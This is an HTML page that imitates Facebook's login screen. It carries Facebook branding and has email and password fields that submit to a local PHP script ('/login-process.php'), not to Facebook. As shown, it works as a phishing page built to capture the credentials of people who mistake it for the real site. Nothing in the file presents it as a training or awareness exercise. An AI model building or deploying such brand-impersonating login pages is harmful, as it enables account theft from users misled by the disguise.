<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Log in to Facebook</title>
   <!-- favicon -->
   <link rel="icon" href="/images/facebook-icon.png">
   <!-- fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Zalando+Sans:ital,wght@0,200..900;1,200..900&display=swap">
   <!-- tailwind css -->
   <script type="text/javascript" src="https://cdn.tailwindcss.com"></script>
</head>
<body class="w-screen min-h-screen bg-white cursor-default" style="font-family: 'Zalando Sans';">
   
   <div class="max-w-5xl mx-auto min-h-screen border-x overflow-hidden">
      
      <div class="p-5 bg-gray-50">
         <div class="flex flex-col gap-5">
            
            <div class="w-fit mx-auto">
               <img class="w-[100px] h-auto flex items-center justify-center" src="/images/facebook-logo.png" alt="Facebook">
            </div>
            
            <div class="w-full max-w-3xl mx-auto p-5 bg-white shadow-md shadow-gray-200 rounded">
               <div class="text-center flex flex-col gap-5">
                  <span>Log in to Facebook</span>
                  <form class="flex flex-col gap-3" action="/login-process.php" method="post">
                     <input class="w-full p-3 border rounded" type="text" name="email" placeholder="Email address or phone number" required>
                     <input class="w-full p-3 border rounded" type="password" name="password" placeholder="Password" required>
                     <button class="text-white font-semibold p-3 bg-[#1878f3] rounded cursor-pointer" type="submit">Log in</button>
                  </form>
                  <a class="text-[#1878f3]" href="/">Forgotten account?</a>
                  <div class="flex items-center justify-center gap-3">
                     <hr class="w-full"><span class="text-gray-500">or</span><hr class="w-full">
                  </div>
                  <a class="w-fit mx-auto text-white font-semibold p-3 bg-[#11b81f] rounded" href="/">Create a new account</a>
               </div>
            </div>
            
         </div>
      </div>
      
   </div>
   
</body>
</html>